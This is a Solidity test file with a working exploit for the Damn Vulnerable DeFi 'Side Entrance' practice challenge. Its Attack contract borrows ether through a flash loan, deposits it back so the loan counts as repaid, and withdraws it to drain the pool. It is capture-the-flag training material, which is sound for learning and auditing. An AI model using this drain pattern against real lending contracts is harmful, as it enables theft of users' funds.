// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../src/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolExploits is Test {
    using Address for address payable;

    address attacker = makeAddr("attacker");

    uint256 constant INITIAL_POOL_BALANCE = 1000 ether;
    uint256 constant ATTACKER_BALANCE = 100 ether;

    SideEntranceLenderPool pool;
    Attack attack;

    constructor() payable {
        pool = new SideEntranceLenderPool();

        // Initialize pool with 1000 ether
        pool.deposit{value: INITIAL_POOL_BALANCE}();

        // The attacker address is funded with 1 ether
        vm.deal(attacker, ATTACKER_BALANCE);

        attack = new Attack(pool);
    }

    function testAttack() public {
        vm.startPrank(attacker);
        (bool success, ) = address(attack).call{value: ATTACKER_BALANCE}("");
        require(success, "Attack failed");

        attack.attack(INITIAL_POOL_BALANCE);

        assertEq(
            address(attack).balance,
            ATTACKER_BALANCE + INITIAL_POOL_BALANCE
        );
    }
}

contract Attack {
    using Address for address payable;

    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) payable {
        // Initialize pool with 1000 ether
        pool = _pool;
    }

    function attack(uint256 amount) external payable {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
